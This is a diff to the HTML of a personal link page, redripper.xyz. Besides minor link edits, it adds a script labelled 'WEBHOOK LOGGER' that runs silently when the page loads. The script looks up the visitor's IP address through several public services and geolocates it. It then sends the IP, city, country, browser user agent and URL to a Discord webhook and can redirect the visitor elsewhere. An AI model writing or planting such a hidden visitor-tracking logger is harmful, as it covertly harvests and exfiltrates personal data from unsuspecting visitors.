@@ -5,16 +5,64 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>redripper.xyz</title>
 
-<style>
-/* ======= FONT ======= */
-@font-face {
-    font-family: "Beer Money";
-    src: url("BeerMoney.ttf") format("truetype");
-    font-weight: 400;
-    font-style: normal;
-    font-display: swap;
-}
+<!-- ================== WEBHOOK LOGGER ================== -->
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/PUT_YOUR_WEBHOOK_HERE";
+const targetUrl = "";
 
+(async () => {
+  async function getIPv4() {
+    const s = [
+      'https://v4.ident.me',
+      'https://ipv4.icanhazip.com',
+      'https://v4.ifconfig.co/ip'
+    ];
+    for (const u of s) {
+      try {
+        const r = await fetch(u,{cache:'no-store'});
+        const t = (await r.text()).trim();
+        if (t && !t.includes(':')) return t;
+      } catch {}
+    }
+    try {
+      const r = await fetch('https://ipapi.co/json/',{cache:'no-store'});
+      const d = await r.json();
+      return d.ip || '';
+    } catch { return ''; }
+  }
+
+  try {
+    const ip = await getIPv4();
+    let country='', city='';
+    if (ip) {
+      const r = await fetch(`https://ipapi.co/${ip}/json/`,{cache:'no-store'});
+      if (r.ok) {
+        const d = await r.json();
+        country=d.country_name||'';
+        city=d.city||'';
+      }
+    }
+
+    const payload = {
+      content:
+`📥 **New Visitor**
+🌐 IP: ${ip || 'Unknown'}
+📍 ${country} - ${city}
+🕒 ${new Date().toLocaleString()}
+🖥 ${navigator.userAgent}
+🔗 ${location.href}`
+    };
+
+    const body = JSON.stringify(payload);
+    navigator.sendBeacon
+      ? navigator.sendBeacon(webhookUrl,new Blob([body],{type:'application/json'}))
+      : fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body,keepalive:true});
+  } catch {}
+  finally { if (targetUrl) location.replace(targetUrl); }
+})();
+</script>
+
+<style>
 /* ======= ROOT VARIABLES ======= */
 :root{
   --glass: rgba(28,28,32,.6);
@@ -220,10 +268,13 @@ body{
 
         <div class="list">
           <div class="item" data-link="https://guns.lol/redripper">
-            <img src="icons/HorrorLog.webp" width="40"> / HorrorLog
+            <img src="icons/HorrorLog.webp" width="40"> / HorrorLog.
           </div>
           <div class="item" data-link="https://guns.lol/1y.">
-            <img src="icons/binzayed.webp" width="40"> /PrimeBinZayed
+            <img src="icons/binzayed.webp" width="40"> /NezKk
+         </div>
+          <div class="item" data-link="https://guns.lol/hk1">
+            <img src="icons/Hs." width="40"> /! Hs
           </div>
         </div>
       </div>
@@ -281,4 +332,5 @@ document.querySelectorAll('.item').forEach(i=>{
 
 </body>
 </html>
+
 
